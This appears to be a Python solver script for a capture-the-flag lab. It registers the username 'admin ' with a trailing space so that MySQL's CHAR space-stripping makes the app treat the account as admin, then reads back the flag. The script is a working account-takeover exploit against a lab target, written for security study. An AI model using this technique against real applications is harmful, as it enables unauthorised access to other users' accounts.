import sys
from pathlib import Path
sys.path.append(str(Path(__file__).resolve().parent.parent))
from utils import get_session, find_flag

BASE_URL = "https://secrets.quoccacorp.com"
PAYLOAD = "admin "

# https://dev.mysql.com/doc/refman/8.4/en/char.html
# When CHAR values are retrieved, trailing spaces are removed

class Solver:
    def __init__(self):
        self.session = get_session()

    def test_lower_method(self):
        TEST_STR = "ADMIN "
        test_str_lower = TEST_STR.lower()
        print(f"{test_str_lower = }\n{len(test_str_lower) = }")

    def main(self):
        response = self.session.post(
            f"{BASE_URL}/register",
            json={
                "username": PAYLOAD,
                "password": "1",
                "secret": "1"
            },
            headers = { "Content-Type": "application/json" }
        )

        response = self.session.get(BASE_URL)
        find_flag(response.text)

if __name__ == "__main__":
    Solver().main()